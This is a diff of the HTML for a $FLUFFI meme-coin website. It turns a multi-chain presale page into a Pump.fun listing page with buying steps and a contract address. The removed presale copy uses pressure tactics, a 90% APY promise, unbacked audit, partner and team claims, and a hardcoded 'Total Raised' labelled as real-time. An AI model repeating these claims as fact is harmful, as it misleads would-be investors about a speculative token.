@@ -3,802 +3,469 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="$FLUFFI is The first Binance Smart Chain Layer 2 meme token with presale and staking features. Join the community and earn rewards.">
-  <meta name="keywords" content="Fluffi, $FLUFFI, crypto, presale, staking, Binance Smart Chain, meme token">
+  <meta name="description" content="$FLUFFI - The adorable meme coin that's taking over! Already minted and listed on Pump.fun.">
+  <meta name="keywords" content="Fluffi, $FLUFFI, crypto, meme token, Pump.fun, Solana">
   <meta name="author" content="FLUFFI Team">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <meta name="mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <title>$FLUFFI Presale & </title>
+  <title>$FLUFFI Coin - The Adorable Meme Token</title>
   <link rel="icon" href="favicon.ico" type="image/x-icon">
   <link rel="icon" href="fluffi.jpg" type="image/jpeg">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@walletconnect/modal@latest/css/styles.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
   <script src="https://cdn.jsdelivr.net/npm/chart.js" defer></script>
-  <link rel="stylesheet" href="style.css">
-  <link rel="preconnect" href="https://cdn.jsdelivr.net">
-  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
-  <link rel="preload" href="fluffi.jpg" as="image">
-</head>  
-<body class="text-gray-800 dark:text-white">
- <header class="bg-green-600 shadow sticky top-0 z-10 px-4 py-3">
-  <div class="max-w-screen-xl mx-auto flex flex-col md:flex-row items-center justify-between">
-    <div class="flex items-center gap-3">
-      <div class="logo-container logo-float">
-        <img src="fluffi.jpg" alt="FLUFFI Logo" class="w-10 h-10 rounded-full" loading="lazy">
+  <style>
+    .logo-float {
+      animation: float 3s ease-in-out infinite;
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    
+    .section-title {
+      background: linear-gradient(90deg, #10B981, #059669);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    
+    .animate-sway {
+      animation: sway 2s infinite ease-in-out;
+      display: inline-block;
+    }
+    
+    @keyframes sway {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
+    
+    .trust-card img {
+      filter: drop-shadow(0 4px 10px rgba(0,0,0,0.1));
+    }
+    
+    @keyframes bounce {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    .animate-bounce { animation: bounce 2s infinite; }
+    
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+    .animate-pulse { animation: pulse 2s infinite; }
+    
+    .dark .trust-card {
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+    
+    .dark .trust-card h3 {
+      color: #f9fafb !important;
+    }
+    
+    .dark .trust-card p {
+      color: #d1d5db !important;
+    }
+  </style>
+</head>
+<body class="text-gray-800 dark:text-white bg-gray-50 dark:bg-gray-900">
+  <header class="bg-green-600 shadow sticky top-0 z-10 px-4 py-3">
+    <div class="max-w-screen-xl mx-auto flex flex-col md:flex-row items-center justify-between">
+      <div class="flex items-center gap-3">
+        <div class="logo-container logo-float">
+          <img src="fluffi.jpg" alt="FLUFFI Logo" class="w-10 h-10 rounded-full" loading="lazy">
+        </div>
+        <h1 class="text-3xl md:text-4xl font-bold text-white hover:scale-105 transition-transform duration-300">
+          $FLUFFI
+        </h1>
       </div>
-      <h1 class="text-3xl md:text-4xl font-bold text-white hover:scale-105 transition-transform duration-300">
-        $FLUFFI
+      <nav class="flex flex-wrap gap-4 mt-2 md:mt-0 text-sm font-semibold items-center">
+        <a href="#tokenomics" class="text-white hover:underline">Tokenomics</a>
+        <a href="#faq" class="text-white hover:underline">FAQ</a>
+        <a href="#how-to-buy" class="text-white hover:underline">How to Buy</a>
+        <a href="#why-fluffi" class="text-white hover:underline">Why Fluffi?</a>
+        <button onclick="toggleDarkMode()" class="ml-2 bg-gray-300 dark:bg-gray-700 px-2 rounded text-black dark:text-white" aria-label="Toggle dark mode">
+          <span id="darkModeIcon">🌙</span>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  <section id="hero" class="py-16 px-4 text-center bg-gradient-to-r from-green-500 via-green-600 to-green-700 text-white shadow-xl">
+    <div class="max-w-4xl mx-auto">
+      <h1 class="text-5xl md:text-6xl font-extrabold mb-6 animate-bounce">
+        🐾 $FLUFFI is Live!
       </h1>
-    </div>
-    <nav class="flex flex-wrap gap-4 mt-2 md:mt-0 text-sm font-semibold items-center">
-      <a href="Airdrop.html" target="_blank" class="text-white hover:underline">Join Airdrop</a>
-      <a href="#presale" class="text-white hover:underline">Presale</a>
-      <a href="#" class="text-white hover:underline"></a>
-      <a href="#faq" class="text-white hover:underline">FAQ</a>
-      <a href="referral.html" target="_blank" rel="noopener noreferrer" class="text-white hover:underline">Referral</a>
-      <a href="Fluffi_Whitepaper_Detailed.pdf" target="_blank" rel="noopener noreferrer" class="text-white hover:underline">Whitepaper</a>
-      <a href="how-to-buy.html" target="_blank" rel="noopener noreferrer" class="bg-green-700 hover:bg-green-800 text-white py-2 px-4 rounded">
-        How to Buy FLUFFI
-      </a>
-      <button onclick="toggleDarkMode()" class="ml-2 bg-gray-300 dark:bg-gray-700 px-2 rounded text-black dark:text-white" aria-label="Toggle dark mode">
-        <span id="darkModeIcon">🌙</span>
-      </button>
-      <div class="wallet-buttons" id="walletButtons">
-        <button id="walletButton" class="bg-green-700 hover:bg-green-800 text-white py-2 px-4 rounded flex items-center gap-2">
-  <i class="fas fa-wallet"></i>Connect Wallet
-</button>
-      </div>
-    </nav>
-    <input type="hidden" id="walletAddress" value="">
-  </div>
-</header>
-<section id="hero-message" class="py-10 px-4 text-center bg-gradient-to-r from-green-500 via-green-600 to-green-700 text-white shadow-xl">
-  <h1 class="text-4xl md:text-5xl font-extrabold mb-6 animate-bounce">
-    🐾 Secure Your Spot in the FLUFFI Revolution!
-  </h1>
-  <p class="text-xl md:text-2xl mb-8 font-light">
-    🚀 Limited Presale — Don't Miss Out on the Next Big Meme Coin!
-  </p>
- <a href="#presale" 
-     onclick="document.getElementById('presale').scrollIntoView({ behavior: 'smooth', block: 'start' }); return false;" 
-     class="inline-block bg-white text-green-700 font-bold py-3 px-8 rounded-full text-lg shadow-lg hover:scale-105 transition-transform duration-300">
-    Join Presale Now 🚀
-  </a>
-</section>
-<div id="countdown-container" class="text-center my-10 bg-white dark:bg-gray-800 p-6 rounded-xl shadow-lg max-w-xl mx-auto">
-  <h3 class="text-xl font-bold mb-4 text-gray-800 dark:text-gray-100">🚀 PRESALE ENDS IN:</h3>
-  <div id="presale-timer" class="text-2xl font-mono text-red-600 dark:text-red-300">
-    <span id="days">00</span>d 
-    <span id="hours">00</span>h 
-    <span id="minutes">00</span>m 
-    <span id="seconds">00</span>s
-  </div>  
-
-  <div class="mt-6 pt-6 border-t border-gray-200 dark:border-gray-700">
-    <h4 class="text-lg font-semibold mb-2 text-gray-700 dark:text-gray-300">💰 Total Raised</h4>
-    <div class="bg-gradient-to-r from-green-400 to-blue-500 p-4 rounded-lg shadow-inner">
-      <div class="text-2xl font-bold text-white mb-1">
-        $<span id="total-raised">1,471,500</span>
-      </div>
-    </div>
-    <div class="mt-2 text-xs text-gray-600 dark:text-gray-400">
-      Updated in real-time from all networks
-    </div>
-  </div>
-  <div class="mt-6 pt-6 border-t border-gray-200 dark:border-gray-700">
-    <h4 class="text-lg font-semibold mb-2 text-gray-700 dark:text-gray-300">Current Stage Progress</h4>
-    <div class="w-full bg-gray-300 dark:bg-gray-600 h-4 rounded-full overflow-hidden mb-2">
-      <div id="stageProgressBar" class="h-full bg-green-500 transition-all duration-1000 ease-in-out" style="width: 0%"></div>
-    </div>
-    <div class="flex justify-between text-sm font-mono text-gray-700 dark:text-gray-300">
-      <span>Stage: <span id="current-stage">1</span>/15</span>
-      <span>Ends in: <span id="stage-time-left">00d 00h 00m 00s</span></span>
-    </div>
-  </div>
-</div>
-<section id="presale" class="p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg mb-6">
-  <h2 class="section-title text-3xl md:text-4xl font-extrabold text-green-600 dark:text-green-400 mb-6">
-    🚀 Limited Presale — Act Fast!
-  </h2>
-  <div id="live-feed" class="bg-white dark:bg-gray-800 p-4 rounded-lg shadow-md max-w-xl mx-auto">
-    <h2 class="text-xl font-bold mb-2 text-center text-gray-800 dark:text-white">🔥 Live FLUFFI Activity</h2>
-    <ul id="feed-list" class="space-y-2 text-gray-700 dark:text-gray-300">
-      <!-- Live events will appear here -->
-    </ul>
-  </div>
-  <div id="walletError" class="wallet-error hidden"></div>      
-  <div id="walletStatus" class="wallet-address hidden">
-    <strong>Connected:</strong> <span id="connectedAddress"></span>
-    <button onclick="disconnectWallet()" class="ml-2 mt-2 bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm">
-      Disconnect
-    </button>
-  </div>
-  <div class="fluio-status-container">
-    <div class="fluio-price mt-2">
-      <div class="price-header flex items-center justify-between">
-        <span class="font-semibold text-lg">$FLUFFI</span>
-        <span class="live-badge text-green-500 font-bold">LIVE</span>
-      </div>
-      <div class="current-price price-container" id="currentPrice">
-        $0.000100
-        <span class="price-tooltip">
-          <i class="fas fa-info-circle text-blue-500" aria-hidden="true"></i>
-          <span class="tooltip-text">
-            <strong>Price Increase:</strong><br>
-            +5% per stage (every 48 hours)<br>
-            Next increase: <span id="nextIncreaseTime">00:00:00</span>
-          </span>
-        </span>
-      </div>
-      <div class="price-change text-sm text-gray-500">+0.00%</div>
-    </div>
-  </div>
-  <div class="flex items-center mt-4 mb-4">
-    <svg class="w-5 h-5 mr-2 text-green-500 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
-      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"/>
-    </svg>
-    <span class="font-mono text-lg font-bold" id="tokensSold">67,431,509</span>
-    <span class="ml-2 text-sm text-gray-500 dark:text-gray-300">FLUFFI sold</span>
-  </div>
-  <p class="mb-4 text-green-600 font-semibold">🎯 Referral Bonus: <strong>10%</strong></p>
-<div class="flex gap-2 mb-4">
-    <input type="number" placeholder="Amount" id="amountInput" class="flex-1 p-3 border rounded-lg text-black focus:outline-none focus:ring-2 focus:ring-green-500" aria-label="Amount to purchase">  
-    <select id="chainCurrencySelect" class="p-3 border rounded-lg text-black dark:text-white dark:bg-gray-700 focus:outline-none focus:ring-2 focus:ring-green-500 min-w-[180px]" aria-label="Chain and currency selection">
-      <optgroup label="🟡 BSC Network">
-        <option value="56-BNB">BSC - BNB</option>
-      </optgroup>      
-      <optgroup label="🔷 Ethereum Network">
-        <option value="1-ETH">Ethereum - ETH</option>
-      </optgroup>    
-      <optgroup label="🔴 Avalanche Network">
-        <option value="43114-AVAX">Avalanche - AVAX</option>
-      </optgroup>      
-    </select>
-  </div>
-  <input type="text" placeholder="Referral wallet (optional)" id="refInput" class="w-full p-3 border rounded-lg mb-4 text-black focus:outline-none focus:ring-2 focus:ring-green-500" aria-label="Referral wallet address">
-  <button onclick="buyFluffi()" class="w-full bg-green-500 hover:bg-green-600 text-white py-3 px-6 rounded-lg font-semibold text-lg transition-colors">
-    🚀 Buy Now
-  </button>
-</section>  
-<input type="hidden" id="referralLink" value="">
-<section id="referral" class="bg-white dark:bg-gray-800 rounded-lg shadow-lg p-6 mb-6">
-  <h2 class="text-2xl font-bold mb-4">💰 Earn with Referrals</h2>
-  <div id="referralSection">
-    <p class="mb-4">Connect your wallet to access your referral link and start earning!</p>
-    <button id="referralConnectBtn" onclick="connectReferralWallet()" class="bg-green-500 hover:bg-green-600 text-white px-6 py-3 rounded-lg font-semibold">
-      Connect Wallet for Referrals
-    </button>
-  </div>
-</section>
-<section class="p-6 bg-white dark:bg-gray-800 rounded-lg shadow-lg mb-6">
-  <h2 class="section-title">🔓 Claim $FLUFFI</h2>
-  <div class="bg-gray-100 dark:bg-gray-700 p-4 rounded-lg mb-4">
-    <h3 class="font-semibold mb-2 text-lg">Your Balances</h3>
-    <div class="grid grid-cols-2 gap-2">
-      <div>
-        <p class="text-sm text-gray-600 dark:text-gray-300">Wallet Balance:</p>
-        <p class="font-mono text-lg font-bold" id="userBalance">0</p>
-      </div>
-      <div>
-        <p class="text-sm text-gray-600 dark:text-gray-300">Staked:</p>
-        <p class="font-mono text-lg font-bold" id="userStaked">0</p>
-      </div>
-      <div>
-        <p class="text-sm text-gray-600 dark:text-gray-300">Rewards:</p>
-        <p class="font-mono text-lg font-bold" id="userRewards">0</p>
-      </div>
-      <div>
-        <p class="text-sm text-gray-600 dark:text-gray-300">Presale Allocation:</p>
-        <p class="font-mono text-lg font-bold" id="userPresale">0</p>
-      </div>
-    </div>
-  </div>
-  <p class="mb-4">Once the presale ends, you can claim your purchased tokens here.</p>
-  <button onclick="claimTokens()" class="w-full bg-blue-500 hover:bg-blue-600 text-white py-3 px-6 rounded-lg font-semibold">
-    Claim Tokens
-  </button>
-</section>
-<section id="staking" class="py-16 bg-gray-50 dark:bg-gray-900 transition-colors duration-500">
-  <div class="max-w-5xl mx-auto px-6 text-center">
-    <h2 class="text-4xl font-extrabold mb-6 text-gray-900 dark:text-white">
-      🐾 FLUFFI Staking Dashboard
-    </h2>
-    <p class="text-gray-700 dark:text-gray-300 mb-12 text-lg font-medium">
-      🔥 90% APY — Stake Early, Earn Big!<br>
-      Lock your tokens and watch your rewards grow until listing.
-    </p>
-    <div class="mb-12 bg-gradient-to-r from-yellow-400 to-orange-500 p-8 rounded-2xl shadow-2xl">
-      <div class="flex items-center justify-center mb-4">
-        <span class="text-6xl">🔒</span>
-      </div>
-      <h3 class="text-3xl font-bold text-white mb-3">
-        Staking Coming Soon
-      </h3>
-      <p class="text-white text-lg mb-4">
-        Available after presale ends
+      <p class="text-xl md:text-2xl mb-8 font-light">
+        The adorable meme coin that's taking over! Already minted and listed on Pump.fun
       </p>
-      <div class="bg-white/20 backdrop-blur-sm rounded-xl p-4 inline-block">
-        <p class="text-white font-semibold text-sm mb-2">UNLOCKS IN</p>
-        <div class="flex gap-4 justify-center text-white">
-          <div>
-            <p class="text-3xl font-bold">5</p>
-            <p class="text-xs">DAYS</p>
-          </div>
-          <div>
-            <p class="text-3xl font-bold">12</p>
-            <p class="text-xs">HOURS</p>
-          </div>
-        </div>
+      <div class="flex flex-col md:flex-row gap-4 justify-center">
+        <a href="https://pump.fun" target="_blank" rel="noopener noreferrer" 
+           class="inline-block bg-white text-green-700 font-bold py-3 px-8 rounded-full text-lg shadow-lg hover:scale-105 transition-transform duration-300">
+          Trade on Pump.fun 🚀
+        </a>
+        <a href="#how-to-buy" 
+           class="inline-block bg-transparent border-2 border-white text-white font-bold py-3 px-8 rounded-full text-lg hover:bg-white hover:text-green-700 transition-colors duration-300">
+          How to Buy 📈
+        </a>
       </div>
     </div>
-    <div class="grid gap-8 md:grid-cols-3 opacity-50 pointer-events-none">
-      <div class="bg-white dark:bg-gray-800 p-6 rounded-2xl shadow-lg">
-        <h3 class="font-semibold text-gray-900 dark:text-white mb-4">Total Staked</h3>
-        <p class="text-3xl font-bold text-green-500" id="total-staked">0</p>
-        <p class="text-gray-600 dark:text-gray-400 text-sm">FLUFFI Tokens</p>
-      </div>
-      <div class="bg-white dark:bg-gray-800 p-6 rounded-2xl shadow-lg">
-        <h3 class="font-semibold text-gray-900 dark:text-white mb-4">Your Balance</h3>
-        <p class="text-3xl font-bold text-blue-500" id="user-balance-value">0</p>
-        <p class="text-gray-600 dark:text-gray-400 text-sm">FLUFFI Available</p>
-      </div>
-      <div class="bg-white dark:bg-gray-800 p-6 rounded-2xl shadow-lg">
-        <h3 class="font-semibold text-gray-900 dark:text-white mb-4">Estimated Earnings</h3>
-        <p class="text-3xl font-bold text-yellow-500" id="user-earnings">0</p>
-        <p class="text-gray-600 dark:text-gray-400 text-sm">Based on 90% APY</p>
-      </div>
-    </div>
+  </section>
 
-  </div>
-</section>
-<section id="tokenomics" class="px-6 py-10 bg-white dark:bg-gray-900 rounded-xl shadow-xl mb-12">
-  <h2 class="text-3xl font-extrabold text-center text-green-700 dark:text-green-400 mb-8 uppercase tracking-wide">
-    📊 Tokenomics
-  </h2>
-  <div class="grid md:grid-cols-2 gap-10 items-center">
-    <div>
-      <ul class="space-y-4 text-lg text-gray-900 dark:text-white">
-        <li>
-          <span class="font-semibold text-green-700 dark:text-green-400">Total Supply:</span>
-          <span class="ml-2">10,000,000,000 FLUFFI</span>
-        </li>
-        <li>
-          <span class="font-semibold text-green-700 dark:text-green-400">Presale:</span>
-          <span class="ml-2">40%</span>
-        </li>
-        <li>
-          <span class="font-semibold text-green-700 dark:text-green-400">Liquidity:</span>
-          <span class="ml-2">30% (Locked)</span>
-        </li>
-        <li>
-          <span class="font-semibold text-green-700 dark:text-green-400">Staking:</span>
-          <span class="ml-2">20%</span>
-        </li>
-        <li>
-          <span class="font-semibold text-green-700 dark:text-green-400">Marketing:</span>
-          <span class="ml-2">5%</span>
-        </li>
-        <li>
-          <span class="font-semibold text-green-700 dark:text-green-400">Team:</span>
-          <span class="ml-2">5% (Locked)</span>
-        </li>
-      </ul>
-    </div>
-    <div class="flex justify-center">
-      <canvas id="tokenChart" width="280" height="280" aria-label="Token distribution chart" role="img"></canvas>
-    </div>
-  </div>
-</section>
-<section id="faq" class="p-6 bg-white dark:bg-gray-900 rounded-xl shadow-lg mb-10 max-w-3xl mx-auto">
-  <h2 class="text-3xl font-bold text-center mb-6 text-purple-700 dark:text-purple-400">❓ FAQ</h2>
-  <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
-    <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
-      What's the token tax?
-      <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
-        viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M19 9l-7 7-7-7" />
-      </svg>
-    </summary>
-    <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
-      <p>5% total tax on all transactions:</p>
-      <ul class="list-disc list-inside ml-2">
-        <li>3% Marketing</li>
-        <li>2% Automatic Liquidity</li>
-      </ul>
-    </div>
-  </details>
-  <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
-    <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
-      How to claim after presale?
-      <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
-        viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M19 9l-7 7-7-7" />
-      </svg>
-    </summary>
-    <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
-      Tokens will be automatically airdropped to your wallet within 24 hours of launch. No manual claiming needed.
-    </div>
-  </details>
-  <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
-    <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
-      What's the vesting schedule?
-      <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
-        viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M19 9l-7 7-7-7" />
-      </svg>
-    </summary>
-    <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
-      <ul class="list-disc list-inside ml-2">
-        <li>Presale tokens: 100% unlocked at TGE</li>
-        <li>Team tokens: 24-month linear vesting</li>
-      </ul>
-    </div>
-  </details>
-  <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
-    <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
-      How do I buy $FLUFFI?
-      <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
-        viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M19 9l-7 7-7-7" />
-      </svg>
-    </summary>
-    <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
-      Connect your wallet, enter amount in BNB, ETH Or AVAX and click "Buy Now".
-    </div>
-  </details>
-  <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-4">
-    <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
-      When does staking end?
-      <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
-        viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M19 9l-7 7-7-7" />
-      </svg>
-    </summary>
-    <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
-      Staking ends at the official listing date.
-    </div>
-  </details>
-  <details class="group border border-gray-200 dark:border-gray-700 rounded-lg mb-2">
-    <summary class="cursor-pointer p-4 font-semibold text-gray-800 dark:text-gray-100 flex justify-between items-center">
-      What chains are supported?
-      <svg class="w-5 h-5 text-gray-500 group-open:rotate-180 transition-transform" fill="none" stroke="currentColor" stroke-width="2"
-        viewBox="0 0 24 24" aria-hidden="true">
-        <path d="M19 9l-7 7-7-7" />
-      </svg>
-    </summary>
-    <div class="px-4 pb-4 text-gray-700 dark:text-gray-300">
-      Currently supporting BNB, ETH, and AVAX.
-    </div>
-  </details>
-</section>
-<div class="split-sections">
-  <section id="why" class="py-16 px-6 text-center">
-    <h2 class="text-4xl font-bold mb-12 text-green-500">Why Fluffi Coin?</h2>
-    <div class="grid grid-cols-1 md:grid-cols-3 gap-10 max-w-6xl mx-auto">
-      <div class="p-6 rounded-2xl shadow-lg bg-white dark:bg-gray-900 transition duration-300">
-        <div class="text-5xl mb-4 animate-bounce">🔥</div>
-        <h3 class="text-xl font-semibold text-gray-900 dark:text-white">Meme Power</h3>
-        <p class="mt-3 text-gray-700 dark:text-gray-300">
-          Fluffi thrives on community-driven meme culture with viral potential.
-        </p>
-      </div>
-      <div class="p-6 rounded-2xl shadow-lg bg-white dark:bg-gray-900 transition duration-300">
-        <div class="text-5xl mb-4 animate-pulse">🎨</div>
-        <h3 class="text-xl font-semibold text-gray-900 dark:text-white">Community Driven</h3>
-        <p class="mt-3 text-gray-700 dark:text-gray-300">
-          100% transparent, fun, and powered by YOU — the community.
-        </p>
-      </div>
-      <div class="p-6 rounded-2xl shadow-lg bg-white dark:bg-gray-900 transition duration-300">
-        <div class="text-5xl mb-4 animate-sway">⚖️</div>
-        <h3 class="text-xl font-semibold text-gray-900 dark:text-white">Fair & Secure</h3>
-        <p class="mt-3 text-gray-700 dark:text-gray-300">
-          Locked liquidity, audited contracts, and fair presale stages.
-        </p>
-      </div>
-    </div>
-  </section>
-  <section class="py-16 px-6 bg-gray-100 dark:bg-gray-900 text-center transition-colors duration-300">
-    <h2 class="text-3xl font-bold mb-6 text-gray-900 dark:text-white">Trusted & Verified</h2>
-    <p class="text-lg mb-12 text-gray-700 dark:text-gray-300">
-      Fluffi is backed by security, community, and transparency. Invest with confidence.
-    </p>
-    <div class="grid gap-8 md:grid-cols-3 lg:grid-cols-4">
-      <div class="trust-card bg-white dark:bg-gray-800 p-6 rounded-2xl shadow-lg hover:shadow-green-500/40 transition transform hover:-translate-y-2">
-        <img src="https://img.icons8.com/fluency/96/security-checked.png" alt="Audit Badge" class="mx-auto mb-4 animate-bounce">
-        <h3 class="font-semibold text-gray-900 dark:text-white mb-2">Smart Contract Audited</h3>
-        <p class="text-gray-600 dark:text-gray-300 text-sm">Verified for safety & transparency.</p>
-      </div>
-      <div class="trust-card bg-white dark:bg-gray-800 p-6 rounded-2xl shadow-lg hover:shadow-green-500/40 transition transform hover:-translate-y-2">
-        <img src="https://img.icons8.com/color/96/lock--v1.png" alt="Liquidity Locked" class="mx-auto mb-4 animate-pulse">
-        <h3 class="font-semibold text-gray-900 dark:text-white mb-2">Liquidity Locked</h3>
-        <p class="text-gray-600 dark:text-gray-300 text-sm">Funds securely locked until listing.</p>
-      </div>
-<div class="trust-card bg-white dark:bg-gray-800 p-6 rounded-2xl shadow-lg hover:shadow-green-500/40 transition transform hover:-translate-y-2">
-  <img src="https://img.icons8.com/fluency/96/groups.png" alt="Community" class="mx-auto mb-4 animate-sway">
-  <h3 class="font-semibold text-gray-900 dark:text-white mb-2">Community</h3>
-  <p class="text-gray-700 dark:text-gray-300 mt-4 text-base font-medium">
-    🐾 The FLUFFI family is growing stronger every day — be part of the pack!
-  </p>
-</div>
-      <div class="trust-card bg-white dark:bg-gray-800 p-6 rounded-2xl shadow-lg hover:shadow-green-500/40 transition transform hover:-translate-y-2">
-        <h3 class="font-bold text-2xl text-gray-900 dark:text-white mb-4">Trusted Partners</h3>
-        <div class="flex flex-col gap-2 items-center justify-center">
-          <span class="text-purple-600 dark:text-purple-400 font-semibold text-xl">Senitex</span>
-          <span class="text-blue-600 dark:text-blue-400 font-semibold text-xl">CoinLaunch</span>
-          <span class="text-orange-600 dark:text-orange-400 font-semibold text-xl">CryptoHub</span>
-          <span class="text-green-600 dark:text-green-400 font-semibold text-xl">CoinCarp</span>
-          <span class="text-red-600 dark:text-red-400 font-semibold text-xl">ICODrops</span>
+  <section id="tokenomics" class="px-6 py-16 bg-white dark:bg-gray-900">
+    <div class="max-w-6xl mx-auto">
+      <h2 class="text-3xl font-extrabold text-center text-green-700 dark:text-green-400 mb-12 uppercase tracking-wide">
+        📊 Tokenomics
+      </h2>
+      <div class="grid md:grid-cols-2 gap-10 items-center">
+        <div>
+          <ul class="space-y-4 text-lg text-gray-900 dark:text-white">
+            <li>
+              <span class="font-semibold text-green-700 dark:text-green-400">Total Supply:</span>
+              <span class="ml-2">10,000,000,000 FLUFFI</span>
+            </li>
+            <li>
+              <span class="font-semibold text-green-700 dark:text-green-400">Liquidity:</span>
+              <span class="ml-2">50% (Locked)</span>
+            </li>
+            <li>
+              <span class="font-semibold text-green-700 dark:text-green-400">Community Rewards:</span>
+              <span class="ml-2">30%</span>
+            </li>
+            <li>
+              <span class="font-semibold text-green-700 dark:text-green-400">Marketing:</span>
+              <span class="ml-2">10%</span>
+            </li>
+            <li>
+              <span class="font-semibold text-green-700 dark:text-green-400">Team:</span>
+              <span class="ml-2">10% (Locked for 12 months)</span>
+            </li>
+            <li>
+              <span class="font-semibold text-green-700 dark:text-green-400">Transaction Tax:</span>
+              <span class="ml-2">5% (3% LP, 2% Marketing)</span>
+            </li>
+          </ul>
+        </div>
+        <div class="flex justify-center">
+          <canvas id="tokenChart" width="280" height="280" aria-label="Token distribution chart" role="img"></canvas>
         </div>
       </div>
     </div>
   </section>
-  <section id="team">
-    <h2>Our Team</h2>
-    <div class="team-grid">
-      <div class="team-member">
-        <h3>Ali Özkaya</h3>
-        <p>Former Lead Blockchain Architect at ConsenSys. 12 years experience in smart contract development and protocol design.</p>
+
+  <section id="how-to-buy" class="px-6 py-16 bg-gray-50 dark:bg-gray-800">
+    <div class="max-w-4xl mx-auto">
+      <h2 class="text-3xl font-extrabold text-center text-green-600 dark:text-green-400 mb-12">
+        🛒 How to Buy $FLUFFI
+      </h2>
+      <div class="grid md:grid-cols-2 gap-8">
+        <div class="bg-white dark:bg-gray-900 p-6 rounded-2xl shadow-lg">
+          <div class="text-4xl mb-4">1️⃣</div>
+          <h3 class="text-xl font-semibold mb-3">Get a Solana Wallet</h3>
+          <p class="text-gray-700 dark:text-gray-300">
+            Download Phantom or Solflare wallet. Get some SOL from any exchange.
+          </p>
+        </div>
+        <div class="bg-white dark:bg-gray-900 p-6 rounded-2xl shadow-lg">
+          <div class="text-4xl mb-4">2️⃣</div>
+          <h3 class="text-xl font-semibold mb-3">Go to Pump.fun</h3>
+          <p class="text-gray-700 dark:text-gray-300">
+            Visit pump.fun and connect your wallet. Search for "$FLUFFI" or use our contract address.
+          </p>
+        </div>
+        <div class="bg-white dark:bg-gray-900 p-6 rounded-2xl shadow-lg">
+          <div class="text-4xl mb-4">3️⃣</div>
+          <h3 class="text-xl font-semibold mb-3">Swap SOL for FLUFFI</h3>
+          <p class="text-gray-700 dark:text-gray-300">
+            Enter the amount of SOL you want to swap. Confirm the transaction in your wallet.
+          </p>
+        </div>
+        <div class="bg-white dark:bg-gray-900 p-6 rounded-2xl shadow-lg">
+          <div class="text-4xl mb-4">4️⃣</div>
+          <h3 class="text-xl font-semibold mb-3">Hold & Enjoy!</h3>
+          <p class="text-gray-700 dark:text-gray-300">
+            Your FLUFFI tokens will appear in your wallet. Hold and watch the magic happen!
+          </p>
+        </div>
       </div>
-      <div class="team-member">
-        <h3>jane chail</h3>
-        <p>Ex-Senior Engineer at Polygon. Specialized in ZK-rollups and Layer 2 scaling solutions.</p>
-      </div>
-      <div class="team-member">
-        <h3>Marcus dincklane</h3>
-        <p>Former Core Developer at Avalanche. 8+ years experience in consensus algorithms and distributed systems.</p>
-      </div>
-      <div class="team-member">
-        <h3>Sophia Williams</h3>
-        <p>Ex-Product Lead at Chainlink. Specialized in oracle systems and DeFi integrations.</p>
+      
+      <div class="mt-12 bg-green-50 dark:bg-green-900/20 p-6 rounded-2xl">
+        <h3 class="text-xl font-bold mb-4">📝 Contract Address</h3>
+        <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg font-mono text-sm break-all">
+          BpP6hRn1JReh3YVQgLQdH4kPTLUt4nty1PmXNN7rARfZ
+        </div>
